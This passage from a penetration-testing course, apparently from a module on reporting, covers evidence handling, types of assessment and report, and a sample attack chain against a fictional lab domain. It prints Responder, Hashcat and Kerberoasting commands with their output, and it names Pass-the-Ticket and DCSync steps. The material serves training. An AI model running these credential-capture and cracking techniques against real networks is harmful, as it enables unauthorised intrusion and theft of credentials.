<p>You should also consider color-coded highlighting in your terminal output to highlight the command that was run and the interesting output from running that command. This enhances the reader&#39;s ability to identify the essential parts of the evidence and what to look for if they try to reproduce it on their own. If you&#39;re working on a complex web payload, it can be difficult to pick out the payload in a gigantic URL-encoded request wall of text if you don&#39;t do this for a living. We should take all opportunities to make the report clearer to our readers, who will often not have as deep an understanding of the environment (especially from the perspective of a penetration tester) as we do by the end of the assessment.</p>
<hr>
<h3 id="what-not-to-archive">What Not to Archive</h3>
<p>When starting a penetration test, we are being trusted by our customers to enter their network and &quot;do no harm&quot; wherever possible. This means not bringing down any hosts or affecting the availability of applications or resources, not changing passwords (unless explicitly permitted), making significant or difficult-to-reverse configuration changes, or viewing or removing certain types of data from the environment. This data may include unredacted PII, potentially criminal info, anything considered legally &quot;discoverable,&quot; etc. For example, if you gain access to a network share with sensitive data, it&#39;s probably best to just screenshot the directory with the files in it rather than opening individual files and screenshotting the file contents. If the files are as sensitive as you think, they&#39;ll get the message and know what&#39;s in them based on the file name. Collecting actual PII and extracting it from the target environment may have significant compliance obligations for storing and processing that data like GDPR and the like and could open up a slew of issues for our company and us.</p>
<hr>
<h3 id="module-exercises">Module Exercises</h3>
<p>We have included a partially filled-out sample Obsidian notebook in the Parrot Linux host that can be spawned at the end of this section. You can access it with the credentials provided using the following command:</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ xfreerdp /</span><span class="hljs-string">v:</span><span class="hljs-number">10.129</span><span class="hljs-number">.203</span><span class="hljs-number">.82</span> <span class="hljs-regexp">/u:htb-student /</span><span class="hljs-string">p:</span>HTB_<span class="hljs-meta">@cademy</span>_stdnt!
</code></pre>
<p>Once connected in, you can open Obsidian from the Desktop, browse the sample notebook, and review the information that has been pre-populated with some sample data based on the lab that we will work against later in this module when we work through some optional (but highly encouraged!) exercises. We also provided a copy of this Obsidian notebook which can be downloaded from <code>Resources</code> in the top right of any section in this module. Once downloaded and unzipped, you can open this in a local copy of Obsidian by selecting <code>Open folder as vault</code>. Detailed instructions for creating or opening a vault can be found <a href="https://help.obsidian.md/Getting+started/Create+a+vault">here</a>.</p>
<hr>
<h3 id="onwards">Onwards</h3>
<p>Now that we&#39;ve gotten a good handle on our notetaking and folder organization structure and what types of evidence to keep and not to keep, and what to log for our reports, let&#39;s talk through the various types of reports our clients may ask for depending on the engagement type.</p>
<h2 id="types-of-reports">Types of Reports</h2>
<hr>
<p>Our report structure will differ slightly depending on the assessment we are tasked to perform. In this module, we will mainly focus on an Internal Penetration Test report where the tester achieved Active Directory (AD) domain compromise during an Internal Penetration Test. The report we will work with will demonstrate the typical elements of an Internal Penetration Test report. We will discuss aspects of other reports (such as additional appendices that may be included in an External Penetration Test report). It&#39;s not uncommon to see an External Penetration Test report that resulted in internal compromise with an attack chain and other elements we will cover. The main difference in our lab is that we will not include OSINT data/publicly available information such as email addresses, subdomains, credentials in breach dumps, domain registration/ownership data, etc., because we are not testing against an actual company with an internet presence. While there are some veteran players that have staying power like Have I Been Pwned, Shodan, and Intelx, OSINT tools are also generally very fluid, so by the time this course is published, the best tool or resource to collect that information may have changed. Instead, we list some common types of information targeted to assist in a penetration test and leave it to the reader to test and discover which tools or APIs provide the best results. It&#39;s always a good idea not to be reliant on any one tool, so run multiple and see what the difference in data is.</p>
<ul>
<li>Public DNS and domain ownership records</li>
<li>Email Addresses<ul>
<li>You can then use these to check if any have been involved in a breach or use Google Dorks to search for them on sites like Pastebin</li>
</ul>
</li>
<li>Subdomains</li>
<li>Third-party vendors</li>
<li>Similar domains</li>
<li>Public cloud resources</li>
</ul>
<p>These types of information gathering are covered in other modules such as <a href="https://academy.hackthebox.com/course/preview/information-gathering---web-edition">Information Gathering - Web Edition</a>, <a href="https://academy.hackthebox.com/course/preview/osint-corporate-recon">OSINT: Corporate Recon</a>, and <a href="https://academy.hackthebox.com/course/preview/footprinting">Footprinting</a> and are outside the scope of this module.</p>
<hr>
<h3 id="differences-across-assessment-types">Differences Across Assessment Types</h3>
<p>Before walking through the various types of reports available and then digging into the components of a Penetration Test report, let&#39;s define a few key assessment types.</p>
<p><strong>Vulnerability Assessment</strong></p>
<p>Vulnerability assessments involve running an automated scan of an environment to enumerate vulnerabilities. These can be authenticated or unauthenticated. No exploitation is attempted, but we will often look to validate scanner results so our report may show a client which scanner results are actual issues and which are false positives. Validation may consist of performing an additional check to confirm a vulnerable version is in use or a setting/misconfiguration is in place, but the goal is not to gain a foothold and move laterally/vertically. Some customers will even ask for scan results with no validation.</p>
<p><strong>Internal vs External</strong></p>
<p>An external scan is performed from the perspective of an anonymous user on the internet targeting the organization&#39;s public systems. An internal scan is conducted from the perspective of a scanner on the internal network and investigates hosts from behind the firewall. This can be done from the perspective of an anonymous user on the corporate user network, emulating a compromised server, or any number of different scenarios. A customer may even ask for an internal scan to be conducted with credentials, which can lead to considerably more scanner findings to sift through but will also produce more accurate and less generic results.</p>
<p><strong>Report Contents</strong></p>
<p>These reports typically focus on themes that can be observed in the scan results and highlight the number of vulnerabilities and their severity levels. These scans can produce a LOT of data, so identifying patterns and mapping them to procedural deficiencies is important to prevent the information from becoming overwhelming.</p>
<hr>
<h3 id="penetration-testing">Penetration Testing</h3>
<p>Penetration testing goes beyond automated scans and can leverage vulnerability scan data to help guide exploitation. Like vulnerability scans, these can be performed from an internal or external perspective. Depending on the type of penetration test (i.e., an evasive test), we may not perform any kind of vulnerability scanning at all.</p>
<p>A penetration test may be performed from various perspectives, such as &quot;<code>black box</code>,&quot; where we have no more information than the name of the company during an external or a network connection for an internal, &quot;<code>grey box</code>&quot; where we are given just in-scope IP addresses/CIDR network ranges, or &quot;<code>white box</code>&quot; where we may be given credentials, source code, configurations, and more. Testing can be performed with <code>zero evasion</code> to attempt to uncover as many vulnerabilities as possible, from a <code>hybrid evasive</code> standpoint to test the customer&#39;s defenses by starting out evasive and gradually becoming &quot;noisier&quot; to see at what level internal security teams/monitoring tools detect and block us. Typically once we are detected in this type of assessment, the client will ask us to move to non-evasive testing for the remainder of the assessment. This is a great assessment type to recommend to clients with some defenses in place but not a highly mature defensive security posture. It can help to show gaps in their defenses and where they should concentrate efforts on enhancing their detection and prevention rules. For more mature clients, this type of assessment can be a great test of their defenses and internal procedures to ensure that all parties perform their roles properly in the event of an actual attack.</p>
<p>Finally, we may be asked to perform <code>evasive testing</code> throughout the assessment. In this type of assessment, we will try to remain undetected for as long as possible and see what kind of access, if any, we can obtain while working stealthily. This can help to simulate a more advanced attacker. However, this type of assessment is often limited by time constraints that are not in place for a real-world attacker. A client may also opt for a longer-term adversary simulation that may occur over multiple months, with few company staff aware of the assessment and few or no client staff knowing the exact start day/time of the assessment. This assessment type is well-suited for more security mature organizations and requires a bit of a different skill set than a traditional network/application penetration tester.</p>
<p><strong>Internal vs External</strong></p>
<p>Similar to vulnerability scanning perspectives, external penetration testing will typically be conducted from the perspective of an anonymous attacker on the internet. It may leverage OSINT data/publicly available information to attempt to gain access to sensitive data via applications or the internal network by attacking internet-facing hosts. Internal penetration testing may be conducted as an anonymous user on the internal network or as an authenticated user. It is typically conducted to find as many flaws as possible to obtain a foothold, perform horizontal and vertical privilege escalation, move laterally, and compromise the internal network (typically the client&#39;s Active Directory environment).</p>
<hr>
<h3 id="inter-disciplinary-assessments">Inter-Disciplinary Assessments</h3>
<p>Some assessments may require involvement from people with diverse skillsets that complement one another. While logistically more complex, these tend to organically be more collaborative in nature between the consulting team and the client, which adds tremendous value to the assessment and trust in the relationship. Some examples of these types of assessments include:</p>
<p><strong>Purple Team Style Assessments</strong></p>
<p>As the name implies, this is a combined effort between the blue and red teams, most commonly a penetration tester and an incident responder. The general concept is that the penetration tester simulates a given threat, and the incident responder works with the internal blue team to review their existing toolset to determine whether alerting is properly configured or if adjustments are needed to enable correct identification.</p>
<p><strong>Cloud Focused Penetration Testing</strong></p>
<p>While heavily overlapping with a conventional penetration test, an assessment with a cloud focus will benefit from the knowledge of someone with a background in cloud architecture and administration. It can often be as simple as helping to articulate to the penetration tester what is possible to abuse with a particular piece of information that was discovered (like secrets or keys of some sort). Obviously, when you start introducing less conventional infrastructure like containers and serverless apps, the approach to testing those resources requires very specific knowledge, likely a different methodology and toolkit entirely. As the reporting for these types of assessments is relatively similar to conventional penetration tests, they are mentioned in this context for awareness, but technical details about testing these unique resources is outside the scope of this course.</p>
<p><strong>Comprehensive IoT Testing</strong></p>
<p>IoT platforms typically have three major components: network, cloud, and application. There are folks who are very specialized in each one of these that will be able to provide a much more thorough assessment together rather than relying on one person with only basic knowledge in each area. Another component that may need to be tested is the hardware layer, which is covered below. Similar to cloud testing, there are aspects of this testing that will likely require a specialized skill set outside the scope of this course, but the standard penetration testing report layout still lends itself well to presenting this type of data nonetheless.</p>
<hr>
<h3 id="web-application-penetration-testing">Web Application Penetration Testing</h3>
<p>Depending on the scope, this type of assessment may also be considered an inter-disciplinary assessment. Some application assessments may only focus on identifying and validating the vulnerabilities in an application with role-based, authenticated testing with no interest in evaluating the underlying server. Others may want to test both the application and the infrastructure with the intent of initial compromise being through the web application itself (again, perhaps from an authenticated or role-based perspective) and then attempting to move beyond the application to see what other hosts and systems behind it exist that can be compromised. The latter type of assessment would benefit from someone with a development and application testing background for initial compromise and then perhaps a network-focused penetration tester to &quot;live off the land&quot; and move around or escalate privileges through Active Directory or some other means beyond the applications itself.</p>
<hr>
<h3 id="hardware-penetration-testing">Hardware Penetration Testing</h3>
<p>This type of testing is often done on IoT-type devices but can be extended to testing the physical security of a laptop shipped by the client or an onsite kiosk or ATM. Each client will have a different comfort level with the depth of testing here, so it&#39;s vital to establish the rules of engagement before the assessment begins, particularly when it comes to destructive testing. If the client expects their device back in one piece and functioning, it is likely inadvisable to try desoldering chips from the motherboard or similar attacks.</p>
<hr>
<h3 id="draft-report">Draft Report</h3>
<p>It is becoming more commonplace for clients to expect to have a dialogue and incorporate their feedback into a report. This may come in many forms, whether they want to add comments about how they plan to address each finding (management response), tweak potentially inflammatory language, or move things around to where it suits their needs better. For these reasons, it&#39;s best to plan on submitting a draft report first, giving the client time to review it on their own, and then offering a time slot where they can review it with you to ask questions, get clarification, or explain what they would like to see. The client is paying for the report deliverable in the end, and we must ensure it is as thorough and valuable to them as possible. Some will not comment on the report at all, while others will ask for significant changes/additions to help it suit their needs, whether it be to make it presentable to their board of directors for additional funding or use the report as an input to their security roadmap for performing remediation and hardening their security posture.</p>
<hr>
<h3 id="final-report">Final Report</h3>
<p>Typically, after reviewing the report with the client and confirming that they are satisfied with it, you can issue the final report with any necessary modifications. This may seem like a frivolous process, but several auditing firms will not accept a draft report to fulfill their compliance obligations, so it&#39;s important from the client&#39;s perspective.</p>
<p><strong>Post-Remediation Report</strong></p>
<p>It is also common for a client to request that the findings you discovered during the original assessment be tested again after they&#39;ve had an opportunity to correct them. This is all but required for organizations beholden to a compliance standard such as PCI. You <strong>should not</strong> be redoing the entire assessment for this phase of the assessment. But instead, you should be focusing on retesting only the findings and only the hosts affected by those findings from the original assessment. You also want to ensure that there is a time limit on how long after the initial assessment we perform remediation testing. Here are some of the things that might happen if you don&#39;t.</p>
<ul>
<li>The client asks you to test their remediation several months or even a year or more later, and the environment has changed so much that it&#39;s impossible to get an &quot;apples to apples&quot; comparison.</li>
<li>If you check the entire environment for new hosts affected by a given finding, you may discover new hosts that are affected and fall into an endless loop of remediation testing the new hosts you discovered last time.</li>
<li>If you run new large-scale scans like vulnerability scans, you will likely find stuff that wasn&#39;t there before, and your scope will quickly get out of control.</li>
<li>If a client has a problem with the &quot;snapshot&quot; nature of this type of testing, you could recommend a Breach and Attack Simulation (BAS) type tool to periodically run those scenarios to ensure they do not continue popping up.</li>
</ul>
<p>If any of these situations occur, you should expect more scrutiny around severity levels and perhaps pressure to modify things that should not be modified to help them out. In these situations, your response should be carefully crafted to be both clear that you’re not going to cross ethical boundaries (but be careful about insinuating that they’re asking you to do something intentionally dishonest, indicating that they are dishonest), but also commiserate with their situation and offer some ways out of it for them. For example, if their concern is being on the hook with an auditor to fix something in an amount of time that they don’t have, they may be unaware that many auditors will accept a thoroughly documented remediation plan with a reasonable deadline on it (and justification for why it cannot be completed more quickly) instead of remediating and closing the finding within the examination period. This allows you to keep your integrity intact, fosters the feeling with the client that you sincerely care about their plight, and gives them a path forward without having to turn themselves inside out to make it happen.</p>
<p>One approach could be to treat this as a new assessment in these situations. If the client is unwilling, then we would likely want to retest just the findings from the original report and carefully note in the report the length of time that has passed since the original assessment, that this is a point in time check to assess whether ONLY the previously reported vulnerabilities affect the originally reported host or hosts and that it&#39;s likely the client&#39;s environment has changed significantly, and a new assessment was not performed.</p>
<p>In terms of report layout, some folks may prefer to update the original assessment by tagging affected hosts in each finding with a status (e.g., resolved, unresolved, partial, etc.), while others may prefer to issue a new report entirely that has some additional comparison content and an updated executive summary.</p>
<hr>
<h3 id="attestation-report">Attestation Report</h3>
<p>Some clients will request an <code>Attestation Letter</code> or <code>Attestation Report</code> that is suitable for their vendors or customers who require evidence that they&#39;ve had a penetration test done. The most significant difference is that your client will not want to hand over the specific technical details of all of the findings or credentials or other secret information that may be included to a third party. This document can be derived from the report. It should focus only on the number of findings discovered, the approach taken, and general comments about the environment itself. This document should likely only be a page or two long.</p>
<hr>
<h3 id="other-deliverables">Other Deliverables</h3>
<p><strong>Slide Deck</strong></p>
<p>You may also be requested to prepare a presentation that can be given at several different levels. Your audience may be technical, or they may be more executive. The language and focus should be as different in your executive presentation as the executive summary is from the technical finding details in your report. Only including graphs and numbers will put your audience to sleep, so it&#39;s best to be prepared with some anecdotes from your own experience or perhaps some recent current events that correlate to a specific attack vector or compromise. Bonus points if said story is in the same industry as your client. The purpose of this is not fear-mongering, and you should be careful not to present it that way, but it will help hold your audience&#39;s attention. It will make the risk relatable enough to maximize their chances of doing something about it.</p>
<p><strong>Spreadsheet of Findings</strong></p>
<p>The spreadsheet of findings should be pretty self-explanatory. This is all of the fields in the findings of your report, just in a tabular layout that the client can use for easier sorting and other data manipulation. This may also assist them with importing those findings into a ticketing system for internal tracking purposes. This document should <em>not</em> include your executive summary or narratives. Ideally, learn how to use pivot tables and use them to create some interesting analytics that the client might find interesting. The most helpful objective in doing this is sorting findings by severity or category to help prioritize remediation.</p>
<hr>
<h3 id="vulnerability-notifications">Vulnerability Notifications</h3>
<p>Sometimes during an assessment, we will uncover a critical flaw that requires us to stop work and inform our clients of an issue so they can decide if they would like to issue an emergency fix or wait until after the assessment is over.</p>
<p><strong>When to Draft One</strong></p>
<p>At a minimum, this should be done for <code>any</code> finding that is <code>directly exploitable</code> that is <code>exposed to the internet</code> and results in unauthenticated remote code execution or sensitive data exposure, or leverage weak/default credentials for the same. Beyond that, expectations should be set for this during the project kickoff process. Some clients may want all high and critical findings reported out-of-band regardless of whether they&#39;re internal or external. Some folks may need mediums as well. It&#39;s usually best to set a baseline for yourself, tell the client what to expect, and let them ask for modifications to the process if they need them.</p>
<p><strong>Contents</strong></p>
<p>Due to the nature of these notifications, it&#39;s important to limit the amount of fluff in these documents so the technical folks can get right to the details and begin fixing the issue. For this reason, it&#39;s probably best to limit this to the typical content you have in the technical details of your findings and provide tool-based evidence for the finding that the client can quickly reproduce if needed.</p>
<hr>
<h3 id="piecing-it-together">Piecing it Together</h3>
<p>Now that we&#39;ve covered the various assessment types and report types we may be asked to create for our clients, let&#39;s move on and talk about the components of a report.</p>
<h2 id="components-of-a-report">Components of a Report</h2>
<hr>
<p>As mentioned previously, the report is the main deliverable that a client is paying for when they contract your firm to perform a penetration test. The report is our chance to show off our work during the assessment and provide the client with as much value as possible. Ideally, the report will be free of extraneous data and information that &quot;clutter&quot; up the report or distract from the issues we are trying to convey of the overall picture of their security posture we are trying to paint. Everything in the report should have a reason for being there, and we don&#39;t want to overwhelm the reader (for example, don&#39;t paste in 50+ pages of console output!). In this section, we&#39;ll cover the key elements of a report and how we can best structure it to show off our work and help our clients prioritize remediation.</p>
<hr>
<h3 id="prioritizing-our-efforts">Prioritizing Our Efforts</h3>
<p>During an assessment, especially large ones, we&#39;ll be faced with a lot of &quot;noise&quot; that we need to filter out to best focus our efforts and prioritize findings. As testers, we are required to disclose everything we find, but when there is a ton of information coming at us through scans and enumeration, it is easy to get lost or focus on the wrong things and waste time and potentially miss high-impact issues. This is why it is essential that we understand the output that our tools produce, have repeatable steps (such as scripts or other tools) to sift through all of this data, process it, and remove false positives or informational issues that could distract us from the goal of the assessment. Experience and a repeatable process are key so that we can sift through all of our data and focus our efforts on high-impact findings such as remote code execution (RCE) flaws or others that may lead to sensitive data disclosure. It is worth it (and our duty) to report informational findings, but instead of spending the majority of our time validating these minor, non-exploitable issues, you may want to consider consolidating some of them into categories that show the client you were aware that the issues existed, but you were unable to exploit them in any meaningful way (e.g., 35 different variations of problems with SSL/TLS, a ton of DoS vulnerabilities in an EOL version of PHP, etc.).</p>
<p>When starting in penetration testing, it can be difficult to know what to prioritize, and we may fall down rabbit holes trying to exploit a flaw that doesn&#39;t exist or getting a broken PoC exploit to work. Time and experience help here, but we should also lean on senior team members and mentors to help. Something that you may waste half a day on could be something that they have seen many times and could tell you quickly whether it is a false positive or worth running down. Even if they can&#39;t give you a really quick black and white answer, they can at least point you in a direction that saves you several hours. Surround yourself with people you&#39;re comfortable with asking for help that won&#39;t make you feel like an idiot if you don&#39;t know all the answers.</p>
<hr>
<h3 id="writing-an-attack-chain">Writing an Attack Chain</h3>
<p>The attack chain is our chance to show off the cool exploitation chain we took to gain a foothold, move laterally, and compromise the domain. It can be a helpful mechanism to help the reader connect the dots when multiple findings are used in conjunction with each other and gain a better understanding of why certain findings are given the severity rating that they are assigned. For example, a particular finding on its own may be <code>medium-risk</code> but, combined with one or two other issues, could elevate it to <code>high-risk</code>, and this section is our chance to demonstrate that. A common example is using <code>Responder</code> to intercept NBT-NS/LLMNR traffic and relaying it to hosts where SMB signing is not present. It can get really interesting if some findings can be incorporated that might otherwise seem inconsequential, like using an information disclosure of some sort to help guide you through an LFI to read an interesting configuration file, log in to an external-facing application, and leverage functionality to gain remote code execution and a foothold inside the internal network.</p>
<p>There are multiple ways to present this, and your style may differ but let&#39;s walk through an example. We will start with a summary of the attack chain and then walk through each step along with supporting command output and screenshots to show the attack chain as clearly as possible. A bonus here is that we can re-use this as evidence for our individual findings so we don&#39;t have to format things twice and can copy/paste them into the relevant finding.</p>
<p>Let&#39;s get started. Here we&#39;ll assume that we were contracted to perform an Internal Penetration Test against the company <code>Inlanefreight</code> with either a VM inside the client&#39;s infrastructure or in their office on our laptop plugged into an ethernet port. For our purposes, this mock assessment was performed from a <code>non-evasive</code> standpoint with a <code>grey box</code> approach, meaning that the client was not actively attempting to interfere with testing and only provided in-scope network ranges and nothing more. We were able to compromise the internal domain <code>INLANEFREIGHT.LOCAL</code> during our assessment.</p>
<p>Note: A copy of this attack chain can also be found in the attached sample report document.</p>
<hr>
<h3 id="sample-attack-chain-inlanefreight-local-internal-penetration-test">Sample Attack Chain - INLANEFREIGHT.LOCAL Internal Penetration Test</h3>
<p>During the Internal Penetration Test performed against Inlanefreight, the tester gained a foothold in the internal network, moved laterally, and ultimately compromised the <code>INLANEFREIGHT.LOCAL</code> Active Directory domain. The below walkthrough illustrates the steps taken to go from an unauthenticated anonymous user in the internal network to Domain Admin level access. The intent of this attack chain is to demonstrate to Inlanefreight the impact of each vulnerability shown in this report and how they fit together to demonstrate the overall risk to the client environment and help to prioritize remediation efforts (i.e., patching two flaws quickly could break up the attack chain while the company works to remediate all issues reported). While other findings shown in this report could be leveraged to gain a similar level of access, this attack chain shows the initial path of least resistance taken by the tester to achieve domain compromise.</p>
<ol>
<li>The tester utilized the <a href="https://github.com/lgandx/Responder">Responder</a> tool to obtain an NTLMv2 password hash for a domain user, <code>bsmith</code>.</li>
<li>This password hash was successfully cracked offline using the <a href="https://github.com/hashcat/hashcat">Hashcat</a> tool to reveal the user&#39;s cleartext password, which granted a foothold into the <code>INLANEFREIGHT.LOCAL</code> domain, but with no more privileges than a standard domain user.</li>
<li>The tester then ran the <a href="https://github.com/fox-it/BloodHound.py">BloodHound.py</a> tool, a Python version of the popular <a href="https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors">SharpHound</a> collection tool to enumerate the domain and create visual representations of attack paths. Upon review, the tester found that multiple privileged users existed in the domain configured with Service Principal Names (SPNs), which can be leveraged to perform a Kerberoasting attack and retrieve TGS Kerberos tickets for the accounts which can be cracked offline using <code>Hashcat</code> if a weak password is set. From here, the tester used the <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py">GetUserSPNs.py</a> tool to carry out a targeted Kerberoasting attack against the <code>mssqlsvc</code> account, having found that the <code>mssqlsvc</code> account had local administrator rights over the host <code>SQL01.INLANEFREIGHT.LOCAL</code> which was an interesting target in the domain.</li>
<li>The tester successfully cracked this account&#39;s password offline, revealing the cleartext value.</li>
<li>The tester authenticated to the host <code>SQL01.INLANEFREIGHT.LOCAL</code> and retrieved a cleartext password from the host&#39;s registry by decrypting LSA secrets for an account (<code>srvadmin</code>), which was set up for autologon.</li>
<li>This <code>srvadmin</code> account had local administrator rights over all servers (aside from Domain Controllers) in the domain, so the tester logged into the <code>MS01.INLANEFREIGHT.LOCAL</code> host and retrieved a Kerberos TGT ticket for a logged-in user, <code>pramirez</code>. This user was part of the <code>Tier I Server Admins</code> group, which granted the account DCSync rights over the domain object. This attack can be utilized to retrieve the NTLM password hash for any user in the domain, resulting in domain compromise and persistence via a Golden Ticket.</li>
<li>The tester used the <a href="https://github.com/GhostPack/Rubeus">Rubeus</a> tool to extract the Kerberos TGT ticket for the <code>pramirez</code> user and perform a Pass-the-Ticket attack to authenticate as this user.</li>
<li>Finally, the tester performed a DCSync attack after successfully authenticating with this user account via the <a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a> tool, which ended in domain compromise.</li>
</ol>
<p><strong>Detailed reproduction steps for this attack chain are as follows:</strong></p>
<p>Upon connecting to the network, the tester started the Responder tool and was able to capture a password hash for the <code>bsmith</code> user by spoofing NBT-NS/LLMNR traffic on the local network segment.</p>
<p><strong>Responder</strong></p>
<pre><code class="lang-shell-session">[!bash!]$  sudo responder -I eth0 -wrfv

                                         __
  .----.-----.-----.-----.-----.-----.--|<span class="hljs-string">  </span>|<span class="hljs-string">.-----.----.
  </span>|<span class="hljs-string">   _</span>|<span class="hljs-string">  -__</span>|<span class="hljs-string">__ --</span>|<span class="hljs-string">  _  </span>|<span class="hljs-string">  _  </span>|<span class="hljs-string">     </span>|<span class="hljs-string">  _  </span>||<span class="hljs-string">  -__</span>|<span class="hljs-string">   _</span>|
  |<span class="hljs-string">__</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_____</span>|<span class="hljs-string">_____</span>|<span class="hljs-string">   __</span>|<span class="hljs-string">_____</span>|<span class="hljs-string">__</span>|<span class="hljs-string">__</span>|<span class="hljs-string">_____</span>||<span class="hljs-string">_____</span>|<span class="hljs-string">__</span>|
                   |<span class="hljs-string">__</span>|

           NBT-NS, LLMNR &amp; MDNS Responder 3.0.6.0

 <span class="hljs-variable">&lt;SNIP&gt;</span>

[+] Generic Options:
    Responder NIC              [eth0]
    Responder IP               [192.168.195.168]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-TWWXTGD94CV]
    Responder Domain Name      [3BKZ.LOCAL]
    Responder DCE-RPC Port     [47032]

[+] Listening for events...

<span class="hljs-variable">&lt;SNIP&gt;</span>

[SMB] NTLMv2-SSP Client   : 192.168.195.205
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\bsmith
[SMB] NTLMv2-SSP Hash     : bsmith::INLANEFREIGHT:7ecXXXXXX98ebc:73D1B2XXXXXXXXXXX45085A651:010100000000000000B588D9F766D801191BB2236A5FAAA50000000002000800330042004B005A0001001E00570049004E002D005400570057005800540047004400390034004300560004003400570049004E002D00540057005700580054004700440039003400430056002E00330042004B005A002E004CXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX2E004C004F00430041004C000700080000B588D9F766D801060004000200000008003000300000000000000001000000002000002CAE5BF3BB1FD2F846A280AEF43A8809C15207BFCB4DF5A580BA1B6FCAF6BBCE0A001000000000000000000000000000000000000900280063006900660073002F003100390032002E003100360038002E003100390035002E00310036003800000000000000000000000000

<span class="hljs-variable">&lt;SNIP&gt;</span>
</code></pre>
<p>The tester was successful in &quot;cracking&quot; this password hash offline using the Hashcat tool and retrieving the cleartext password value, thus granting a foothold to enumerate the Active Directory domain.</p>
<p><strong>Hashcat</strong></p>
<pre><code class="lang-shell-session">[!bash!]$ hashcat -m <span class="hljs-number">5600</span> bsmith_hash <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt 

hashcat (v6<span class="hljs-number">.1</span><span class="hljs-number">.1</span>) starting...

&lt;SNIP&gt;

Dictionary cache <span class="hljs-string">hit:</span>
* Filename..: <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt
* Passwords.: <span class="hljs-number">14344385</span>
* Bytes.....: <span class="hljs-number">139921507</span>
* Keyspace..: <span class="hljs-number">14344385</span>
<span class="hljs-symbol">
BSMITH:</span>:<span class="hljs-string">INLANEFREIGHT:</span><span class="hljs-number">7</span><span class="hljs-string">eccd965c4b98ebc:</span><span class="hljs-number">73</span><span class="hljs-string">d1b2c8c5f9861eefd31bb45085a651:</span><span class="hljs-number">010100000000000000</span><span class="hljs-string">b588d9f766d801191bb2236a5faaa50000000002000800330042004b005a0001001e00570049004e002d00540057005700580054004700440039003400430056XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX004700440039003400430056002e00330042004b005a002e004c004f00430041004c0003001400330042004b005a002e004c004f00430041004c0005001400330042004b005a002e004c004f00430041004c000700080000b588d9f766d801060004000200000008003000300000000000000001000000002000002cae5bf3bb1fd2f846a280aef43a8809c15207bfcb4df5a580ba1b6fcaf6bbce0a001000000000000000000000000000000000000900280063006900660073002f003100390032002e003100360038002e003100390035002e00310036003800000000000000000000000000:</span>&lt;REDACTED&gt;
</code></pre>
<p>The tester proceeded to enumerate user accounts configured with Service Principal Names (SPNs) that may be subject to a Keberoasting attack. This lateral movement/privilege escalation technique targets SPNs (unique identifiers that Kerberos uses to map a service instance to a service account). Any domain user can request a Kerberos ticket for any service account in the domain, and the ticket is encrypted with the service account&#39;s NTLM password hash, which can potentially be &quot;cracked&quot; offline to reveal the account&#39;s cleartext password value.</p>
<p><strong>GetUserSPNs</strong></p>
<pre><code class="lang-shell-session">[!bash!]$ GetUserSPNs<span class="hljs-selector-class">.py</span> INLANEFREIGHT.LOCAL/bsmith -dc-ip <span class="hljs-number">192.168</span>.<span class="hljs-number">195.204</span>

Impacket v0.<span class="hljs-number">9.24</span>.dev1+<span class="hljs-number">20210922.102044</span><span class="hljs-selector-class">.c7bc76f8</span> - Copyright <span class="hljs-number">2021</span> SecureAuth Corporation

Password:
ServicePrincipalName                         Name       MemberOf  PasswordLastSet             LastLogon  Delegation 
-------------------------------------------  ---------  --------  --------------------------  ---------  ----------
MSSQLSvc/SQL01<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span>:<span class="hljs-number">1433</span>      mssqlsvc             <span class="hljs-number">2022</span>-<span class="hljs-number">05</span>-<span class="hljs-number">13</span> <span class="hljs-number">16</span>:<span class="hljs-number">52</span>:<span class="hljs-number">07.280623</span>  &lt;never&gt;               
MSSQLSvc/SQL02<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span>:<span class="hljs-number">1433</span>      sqlprod              <span class="hljs-number">2022</span>-<span class="hljs-number">05</span>-<span class="hljs-number">13</span> <span class="hljs-number">16</span>:<span class="hljs-number">54</span>:<span class="hljs-number">52.889815</span>  &lt;never&gt;               
MSSQLSvc/SQL-DEV01<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span>:<span class="hljs-number">1433</span>  sqldev               <span class="hljs-number">2022</span>-<span class="hljs-number">05</span>-<span class="hljs-number">13</span> <span class="hljs-number">16</span>:<span class="hljs-number">54</span>:<span class="hljs-number">57.905315</span>  &lt;never&gt;               
MSSQLSvc/QA001<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span>:<span class="hljs-number">1433</span>      sqlqa                <span class="hljs-number">2022</span>-<span class="hljs-number">05</span>-<span class="hljs-number">13</span> <span class="hljs-number">16</span>:<span class="hljs-number">55</span>:<span class="hljs-number">03.421004</span>  &lt;never&gt;               
backupjob/veam001<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span>        backupjob            <span class="hljs-number">2022</span>-<span class="hljs-number">05</span>-<span class="hljs-number">13</span> <span class="hljs-number">18</span>:<span class="hljs-number">38</span>:<span class="hljs-number">17.740269</span>  &lt;never&gt;               
vmware/vc<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span>                vmwaresvc            <span class="hljs-number">2022</span>-<span class="hljs-number">05</span>-<span class="hljs-number">13</span> <span class="hljs-number">18</span>:<span class="hljs-number">39</span>:<span class="hljs-number">10.691799</span>  &lt;never&gt;
</code></pre>
<p>The tester then ran the Python version of the popular BloodHound Active Directory enumeration tool to collect information such as users, groups, computers, ACLs, group membership, user and computer properties, user sessions, local admin access, and more. This data can then be imported into a GUI tool to create visual representations of relationships within the domain and map out &quot;attack paths&quot; that can be used to potentially move laterally or escalate privileges within a domain.</p>
<p><strong>Bloodhound</strong></p>
